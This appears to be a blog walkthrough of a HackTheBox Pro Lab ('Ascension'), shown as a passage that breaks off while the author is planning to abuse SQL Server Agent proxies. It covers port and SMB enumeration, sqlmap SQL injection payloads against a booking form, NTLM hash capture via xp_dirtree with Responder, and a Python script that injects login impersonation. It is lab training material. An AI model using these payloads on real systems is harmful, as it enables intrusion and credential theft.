---
title: HTB-Ascension
description: 'Pro Labs-Ascension'
pubDate: 2026-03-26
image: /Pro-Labs/Ascension.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/hackthebox-prolabs/Ascension-1.png)

# Introduction  
> Daedalus Airlines is quickly becoming a major player in global aviation.  
代达罗斯航空正迅速成为全球航空的重要参与者。
>
> The pace of growth has meant that the company has accumulated a lot of technical debt. In order to avoid a data breach and potentially putting their supply chain at risk, Daedalus have hired your Cyber Security firm to test their systems.  
增长速度导致公司积累了大量技术债务。为了避免数据泄露并可能危及供应链，代达罗斯聘请了您的网络安全公司来测试他们的系统。
>
> Ascension is designed to test your skills in Enumeration, Exploitation, Pivoting, Forest Traversal and Privilege Escalation inside two small Active Directory networks.  
Ascension 旨在测试您在两个小型 Active Directory 网络中枚举、利用、枢轴、森林穿越和权限升级方面的技能。
>
> The goal is to gain access to the trusted partner, pivot through the network and compromise two Active Directory forests while collecting several flags along the way. Can you Ascend?  
目标是获得可信合作伙伴的访问权限，穿越网络，攻破两个 Active Directory 森林，同时收集多个标志。你能升华吗？
>
> Entry Point: `<font style="color:rgb(135, 153, 181);background-color:rgba(135, 153, 181, 0.2);">10.13.38.20</font>`  
入口地址：`<font style="color:rgb(135, 153, 181);background-color:rgba(135, 153, 181, 0.2);">10.13.38.20</font>`
>

# StartPoint-10.13.38.20
## rustscan
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# rustscan -a 10.13.38.20 -- -A -n                                                              
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.13.38.20:80
Open 10.13.38.20:135
Open 10.13.38.20:139
Open 10.13.38.20:445
Open 10.13.38.20:3389

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: AC72ED4FDB48B2DC36139034ED34832F
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Daedalus Airlines
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB01.daedalus.local
| Issuer: commonName=WEB01.daedalus.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-23T03:52:39
| Not valid after:  2026-09-22T03:52:39
| MD5:     1c8f c566 6f5c d99c 1523 b973 04d0 899c
| SHA-1:   8546 15bd 0d7d 1f93 5fc5 6f14 c323 440a ce24 5982
| SHA-256: 7e62 5abc b9fc 01c3 0bce 3e13 20d8 a15f 3ac7 c8e6 c74e 5395 e719 285d 167d 0cfe
| -----BEGIN CERTIFICATE-----
| MIIC7DCCAdSgAwIBAgIQFYjG0dFwlKdLmSxOMY3KZDANBgkqhkiG9w0BAQsFADAf
| MR0wGwYDVQQDExRXRUIwMS5kYWVkYWx1cy5sb2NhbDAeFw0yNjAzMjMwMzUyMzla
| Fw0yNjA5MjIwMzUyMzlaMB8xHTAbBgNVBAMTFFdFQjAxLmRhZWRhbHVzLmxvY2Fs
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3olvan/KGzzKbXUCoJ6Q
| D7EXc0B/Kenl96D1L2Kj7GEjk/auSB8ewg/D9olKMTT+qt7J9W1dQzubRsJ0oF37
| kCWRzhqB3dA/dOMa9iXYxVuhwK3S+mMDJG2F2o35rbwlFQ3dn6cBueatJu7UFELv
| dBVTlx2vRdGA0RhJD5fi0gdqWH1zvQ0LO+M3LIiZ+uDyVxKywhMD5nPtEOpli3Dn
| 4JD1QDT+vcCECcQpRDkV2I7sTPy8whUZDPiW7hs/18qT+fUUXOdizb9TB06cWgit
| 6ElgWHGZxBRtA0lCKu6MKMQTDdNyQyh3SAHERviec1Q4y8giperD+3vk0+gxlOZo
| 4QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJ
| KoZIhvcNAQELBQADggEBAHx4Qb6AT3bJ9IxX+gVZM04+x7YCIK/PlIll/1lBgAij
| eYRn4rArGn7ObkaQPnwi3wpF7AERQGMTZQBIougUmYnuBdpWXf5bZWOQzAAc8+U3
| GF2ob1rWaklZwB56BlCitgYXojvAyeC4YQjZP4rT5CTiL5bmkhpEf9v+v0BaPTEX
| NNqaVqwhxkGndQv51VGtEDZRpx9i7RpXDOdfb4yo3f3e6iVoS2zpGv3HjOJJc3zn
| 4H1SThvxUTw882a0WjQTi7duxJT9TaGyaKQxper/dGBzGcaMxJaZ5KbsKhfaeBpF
| I3x85BH7ze7sdYrakikgHlVrj334CvHSo3Q+Pz+8ycI=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: DAEDALUS
|   NetBIOS_Domain_Name: DAEDALUS
|   NetBIOS_Computer_Name: WEB01
|   DNS_Domain_Name: daedalus.local
|   DNS_Computer_Name: WEB01.daedalus.local
|   DNS_Tree_Name: daedalus.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-24T08:23:38+00:00
|_ssl-date: 2026-03-24T08:24:18+00:00; +16m32s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/24%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69C24653%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=109%II=I%TS=U)
SEQ(SP=FF%GCD=1%ISR=10F%II=I%TS=U)
OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62505/tcp): CLEAN (Timeout)
|   Check 2 (port 35290/tcp): CLEAN (Timeout)
|   Check 3 (port 20757/udp): CLEAN (Timeout)
|   Check 4 (port 57438/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h40m32s, deviation: 3h07m51s, median: 16m31s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: WEB01
|   NetBIOS computer name: WEB01\x00
|   Domain name: daedalus.local
|   Forest name: daedalus.local
|   FQDN: WEB01.daedalus.local
|_  System time: 2026-03-24T01:23:40-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-24T08:23:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   225.65 ms 10.10.16.1
2   258.86 ms 10.13.38.20
```

### 添加hosts
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# echo "10.13.38.20 WEB01.daedalus.local" >> /etc/hosts
```

## SMB
### enum4linux-ng
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# enum4linux-ng -A 10.13.38.20
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.13.38.20
[*] Username ......... ''
[*] Random Username .. 'masolsjq'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ====================================
|    Listener Scan on 10.13.38.20    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ==========================================================
|    NetBIOS Names and Workgroup/Domain for 10.13.38.20    |
 ==========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ========================================
|    SMB Dialect Check on 10.13.38.20    |
 ========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.0.2: true
  SMB 2.1: true                                                                                         
  SMB 3.0: true                                                                                         
  SMB 3.1.1: true                                                                                       
Preferred dialect: SMB 3.0                                                                              
SMB1 only: false                                                                                        
SMB signing required: false                                                                             

 ==========================================================
|    Domain Information via SMB session for 10.13.38.20    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WEB01                                                                            
NetBIOS domain name: DAEDALUS                                                                           
DNS domain: daedalus.local                                                                              
FQDN: WEB01.daedalus.local                                                                              
Derived membership: domain member                                                                       
Derived domain: DAEDALUS                                                                                

 ========================================
|    RPC Session Check on 10.13.38.20    |
 ========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ==============================================
|    OS Information via RPC for 10.13.38.20    |
 ==============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows Server 2019 Standard 17763                                                                  
OS version: '10.0'                                                                                      
OS release: '1809'                                                                                      
OS build: '17763'                                                                                       
Native OS: Windows Server 2019 Standard 17763                                                           
Native LAN manager: Windows Server 2019 Standard 6.3                                                    
Platform id: null                                                                                       
Server type: null                                                                                       
Server type string: null                                                                                

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials
```

## WEB
> 访问80端口(UI设计的好美啊，我很喜欢，看得我都想报名参加旅游了)
>

![](/image/hackthebox-prolabs/Ascension-2.png)

### dirsearch
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# dirsearch -u http://10.13.38.20/    
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/Ascension/reports/http_10.13.38.20/__26-03-24_16-05-39.txt

Target: http://10.13.38.20/

[16:05:39] Starting: 
[16:05:44] 403 -  312B  - /%2e%2e//google.com                               
[16:05:45] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[16:05:58] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:06:22] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[16:06:36] 200 -    5KB - /footer.php                                       
[16:06:38] 200 -    2KB - /header.php                                       
[16:06:41] 200 -   15KB - /index.php                                        
[16:07:15] 301 -  149B  - /static  ->  http://10.13.38.20/static/  
```

### footer
> **/footer.php **
>
> **关于 Daedalus**
>
> 世界变得如此快节奏，以至于人们不愿驻足阅读一页页的信息，他们更倾向于观看演示文稿以理解信息。如今已经到了图像和视频被更多地用于……（原文此处中断）的地步。
>
> 尝试下载该页面头像图片进行破解，发现并无隐写内容
>

![](/image/hackthebox-prolabs/Ascension-3.png)

### book-trip
> **/book-trip.php**
>
> **填写信息，传入引号后发现页面显示MSSQL的报错信息，确定存在SQL注入**
>

![](/image/hackthebox-prolabs/Ascension-4.png)

### SQLMAP
#### 数据包
```bash
POST /book-trip.php HTTP/1.1
Host: 10.13.38.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://10.13.38.20
Connection: keep-alive
Referer: http://10.13.38.20/book-trip.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

destination=test&adults=test&children=test
```

#### Payload
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# sqlmap -r sqlinject --batch
        ___
       __H__                                                                                            
 ___ ___[(]_____ ___ ___  {1.10.2#stable}                                                               
|_ -| . [,]     | .'| . |                                                                               
|___|_  [(]_|_|_|__,|  _|                                                                               
      |_|V...       |_|   https://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:53:38 /2026-03-24/

[16:53:38] [INFO] parsing HTTP request from 'sqlinject'
[16:53:38] [INFO] testing connection to the target URL
[16:53:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:53:40] [INFO] testing if the target URL content is stable
[16:53:40] [INFO] target URL content is stable
[16:53:40] [INFO] testing if POST parameter 'destination' is dynamic
[16:53:41] [WARNING] POST parameter 'destination' does not appear to be dynamic
[16:53:41] [INFO] heuristic (basic) test shows that POST parameter 'destination' might be injectable (possible DBMS: 'Microsoft SQL Server')
[16:53:42] [INFO] testing for SQL injection on POST parameter 'destination'
it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1) values? [Y/n] Y
[16:53:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:53:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:53:47] [INFO] testing 'Generic inline queries'
[16:53:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[16:53:48] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'                                                                                                
[16:53:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[16:53:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'                                                                                                  
[16:53:52] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[16:54:13] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[16:54:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:54:35] [WARNING] reflective value(s) found and filtering out
[16:54:35] [INFO] POST parameter 'destination' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' injectable                                                                        
[16:54:35] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[16:54:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:54:47] [INFO] POST parameter 'destination' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable                                                                                 
[16:54:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[16:54:59] [INFO] POST parameter 'destination' appears to be 'Microsoft SQL Server/Sybase time-based blind (IF)' injectable                                                                                     
[16:54:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
POST parameter 'destination' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 138 HTTP(s) requests:
---
Parameter: destination (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: destination=test' AND 2184 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (2184=2184) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)))-- mATp&adults=test&children=test

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: destination=test';WAITFOR DELAY '0:0:5'--&adults=test&children=test

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: destination=test' WAITFOR DELAY '0:0:5'-- iYiQ&adults=test&children=test
---
[16:54:59] [INFO] testing Microsoft SQL Server
[16:55:00] [INFO] confirming Microsoft SQL Server
[16:55:02] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2016 or 2022 or 2019 or 11
web application technology: PHP 7.3.7, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017

[*] ending @ 16:55:02 /2026-03-24/
```

#### GetHash
##### 监听
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# responder -I tun0 -wv
```

##### SMB认证
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# sqlmap -r sqlinject --sql-query="EXEC master..xp_dirtree '\\\\10.10.16.32\\share'" --batch
```

##### 捕获hash
> 捕获到的是机器账户 DAEDALUS\WEB01$ 密码是120位随机字符，几乎不可能爆破
>

```bash
[+] Listening for events...                                                                             

[SMB] NTLMv2-SSP Client   : 10.13.38.20
[SMB] NTLMv2-SSP Username : DAEDALUS\WEB01$
[SMB] NTLMv2-SSP Hash     : WEB01$::DAEDALUS:71d0912c6a8da118:8874A53437D2D402450C53AF7206AE41:010100000000000000D955A4B0BBDC01E2E69BD5D1881CC30000000002000800300045003800540001001E00570049004E002D00300044004A00350032004B004400340057005400330004003400570049004E002D00300044004A00350032004B00440034005700540033002E0030004500380054002E004C004F00430041004C000300140030004500380054002E004C004F00430041004C000500140030004500380054002E004C004F00430041004C000700080000D955A4B0BBDC0106000400020000000800300030000000000000000000000000300000F08DBC512D4FE634FFEC049E0E597D76DF62A17680BEB2BD5BAA26F56C8E994A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330032000000000000000000  
```

#### 枚举用户
```bash
sqlmap -r sqlinject --batch --no-cast --sql-query="SELECT STUFF((SELECT CHAR(44)+name FROM sys.server_principals WHERE type IN ('S','U','G') AND name NOT LIKE '##%' FOR XML PATH('')),1,1,'')"
```

```bash
database management system users [18]:
[*] ##MS_AgentSigningCertificate##
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] daedalus
[*] daedalus_admin
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQLSERVER
[*] NT SERVICE\\SQLSERVERAGENT
[*] NT SERVICE\\SQLTELEMETRY
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa
[*] WEB01\\svc_dev
```

#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">查属 SQL Agent 角色</font>
```bash
sqlmap -r sqlinject --batch --no-cast --technique=E --sql-query="SELECT mp.name+CHAR(58)+dp.name FROM msdb.sys.database_role_members drm JOIN msdb.sys.database_principals dp ON drm.role_principal_id=dp.principal_id JOIN msdb.sys.database_principals mp ON drm.member_principal_id=mp.principal_id WHERE dp.name IN ('SQLAgentUserRole','SQLAgentReaderRole','SQLAgentOperatorRole')"
```

```bash
[*] daedalus_admin:SQLAgentOperatorRole
[*] daedalus_admin:SQLAgentReaderRole
[*] daedalus_admin:SQLAgentUserRole
[*] dc_operator:SQLAgentUserRole
[*] MS_DataCollectorInternalUser:SQLAgentUserRole
[*] PolicyAdministratorRole:SQLAgentOperatorRole
[*] SQLAgentOperatorRole:SQLAgentReaderRole
[*] SQLAgentReaderRole:SQLAgentUserRole
[*] WEB01\\svc_dev:SQLAgentOperatorRole
[*] WEB01\\svc_dev:SQLAgentReaderRole
[*] WEB01\\svc_dev:SQLAgentUserRole
```

#### 身份信息
> 结果1：当前执行SQL的登录身份是daedalus，这是Web应用连接数据库用的账户，权限受限
>
> 结果2：仅有VIEW ANY DEFINITION + VIEW SERVER STATE 
>
> 没有CONTROL SERVER、SYSADMIN、xp_cmdshell执行权限，靠这个账户直接RCE是不可能的
>
> 结果3：HAS_PERMS_BY_NAME = 1
>
> daedalus这个登录对daedalus_admin这个LOGIN具有IMPERSONATE权限
>

```bash
sqlmap -r sqlinject --sql-query="SELECT SYSTEM_USER" --batch
sqlmap -r sqlinject --sql-query="SELECT permission_name FROM fn_my_permissions(NULL,'SERVER')" --batch
sqlmap -r sqlinject --sql-query="SELECT HAS_PERMS_BY_NAME('daedalus_admin','LOGIN','IMPERSONATE')" --batch
```

```bash
SYSTEM_USER = daedalus
具备 VIEW ANY DEFINITION、VIEW SERVER STATE
HAS_PERMS_BY_NAME(..., 'IMPERSONATE') = 1
```

#### IMPERSONATE检查
> Impersonate是SQL Server中的一种安全机制，允许使用Win客户端身份而非SQL Server服务账户身份
>
> HAS_PERMS_BY_NAME 的系统函数，直接检查自己有没有权限
>
> 返回 daedalus_admin：1 ，代表可以**模拟**daedalus_admin用户
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# sqlmap -r sqlinject --sql-query="SELECT HAS_PERMS_BY_NAME('daedalus_admin','LOGIN','IMPERSONATE')" --batch
        ___
       __H__                                                                                            
 ___ ___[.]_____ ___ ___  {1.10.2#stable}                                                               
|_ -| . [,]     | .'| . |                                                                               
|___|_  [)]_|_|_|__,|  _|                                                                               
      |_|V...       |_|   https://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:15:39 /2026-03-24/

[19:15:40] [INFO] fetching SQL SELECT statement query output: 'SELECT HAS_PERMS_BY_NAME('daedalus_admin','LOGIN','IMPERSONATE')'                                                                                
[19:15:40] [WARNING] reflective value(s) found and filtering out
[19:15:40] [INFO] retrieved: '1'
SELECT HAS_PERMS_BY_NAME('daedalus_admin','LOGIN','IMPERSONATE'): '1'
```

#### 检查daedalus_admin用户
> <font style="color:rgb(6, 10, 38);">SQL Server Agent 是 MSSQL 内置的任务调度系统，可以创建一个"作业(Job)"，让它执行命令</font>
>
> Job 有多种执行子系统：
>
> <font style="color:rgb(6, 10, 38);">  - CmdExec — 执行 Windows 命令行命令</font>
>
> <font style="color:rgb(6, 10, 38);">  - PowerShell — 执行 PowerShell</font>
>
> msdb 是SQL Server Agent专用数据库，Agent Job的权限通过这三个角色控制：
>
>   - SQLAgentUserRole — 可以创建Job
>
>   - SQLAgentReaderRole — 可以查看Job
>
>   - SQLAgentOperatorRole — 可以执行所有Job
>
> 如果 daedalus_admin 有这些角色，结合IMPERSONATE，我们就能以它的身份创建并执行Agent Job
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# sqlmap -r sqlinject --sql-query="SELECT dp.name FROM msdb.sys.database_role_members drm JOIN msdb.sys.database_principals dp ON drm.role_principal_id=dp.principal_id JOIN msdb.sys.database_principals mp ON drm.member_principal_id=mp.principal_id WHERE mp.name='daedalus_admin'" --batch
  
[19:18:07] [INFO] fetching SQL SELECT statement query output: 'SELECT dp.name FROM msdb.sys.database_role_members drm JOIN msdb.sys.database_principals dp ON drm.role_principal_id=dp.principal_id JOIN msdb.sys.database_principals mp ON drm.member_principal_id=mp.principal_id WHERE mp.name='daedalus_admin''     
[19:18:07] [WARNING] reflective value(s) found and filtering out
[19:18:07] [INFO] retrieved: 'SQLAgentOperatorRole'
[19:18:08] [INFO] retrieved: 'SQLAgentReaderRole'
[19:18:08] [INFO] retrieved: 'SQLAgentUserRole'
SELECT dp.name FROM msdb.sys.database_role_members drm JOIN msdb.sys.database_principals dp ON drm.role_principal_id=dp.principal_id JOIN msdb.sys.database_principals mp ON drm.member_principal_id=mp.principal_id WHERE mp.name='daedalus_admin' [3]:
[*] SQLAgentOperatorRole
[*] SQLAgentReaderRole
[*] SQLAgentUserRole
```

#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">验证 impersonation</font>
> 1. `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">sqlmap --sql-query</font>**`**<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 跑多语句 impersonation</font>**<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">sqlmap --sql-query</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 会把 </font>
>
> `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">EXEC AS LOGIN ...; INSERT ...; REVERT;</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 拆开执行，导致上下文丢失</font>
>
> <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">所以凡是依赖“同一请求、同一会话”的语句，我改用 Python </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">requests</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 直接发一次 POST</font>
>

##### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">建表</font>
> 用sqlmap的stacked  queries执行DDL语句，在daedalus库里创建一张临时中转表
>
> 列类型sysname等价于nvarchar(128)，专门存用户名/对象名
>

```bash
sqlmap -r sqlinject --sql-query="CREATE TABLE daedalus.dbo.impcheck5 (u sysname)" --batch
```

##### 插入
> 用stacked queries执行写操作，绕开了error-based只能读数据的限制
>
> 1. EXEC AS LOGIN = 'daedalus_admin' — 切换到daedalus_admin身份
> 2. INSERT ... SELECT SYSTEM_USER — 把当前SYSTEM_USER插入中转表（验证IMPERSONATE是否成功，成功则插入daedalus_admin）
> 3. REVERT — 切换回daedalus
>

```bash
import requests

url = "http://10.13.38.20/book-trip.php"
data = {
    "destination": "test'; EXEC AS LOGIN = N'daedalus_admin'; INSERT INTO daedalus.dbo.impcheck5 SELECT SYSTEM_USER; REVERT;-- -",
    "adults": "test",
    "children": "test",
}
r = requests.post(url, data=data)
print(r.status_code)
print(r.text[:300])
```

##### 读取
> 1. <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">--force-pivoting 强制使用pivoting技术提取数据</font>
>
> <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">把多列拼成一个值通过error-based单次返回，绕过sqlmap多列提取失败的问题</font>
>
> 2. <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">说明已经能在同一条注入请求里成功切换为 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">daedalus_admin</font>**`
>

```bash
sqlmap -r sqlinject -D daedalus -T impcheck5 --dump --batch --fresh-queries --force-pivoting

结果为：
daedalus_admin
```

#### 查询sysproxies
> Job 以谁的身份运行？
>
> 默认情况下，Job 以 SQL Server 服务账户运行。但如果配置了 Proxy（代理账户），Job 可以以指定的 Windows 账户身份运行，因此我们需要查询sysproxies
>
> 查询sysproxies可以令我们知道：
>
>   1. 有没有 Proxy
>
>   2. Proxy 对应哪个 Windows 账户
>
>   3. Proxy 的 proxy_id 是多少（创建 Job 时需要指定）
>
> 
>
> Proxy存储的就是credential_identity，即一个Windows账户名
>
> 如果 Proxy 对应的是一个有价值的 Windows 账户（比如 svc_dev），我们创建的 Job
>
> 就会以那个账户身份执行系统命令，从而拿到那个账户的 shell
>
> 没有这一步，你创建的Job要么以低权限服务账户运行，要么不知道该填哪个proxy_id
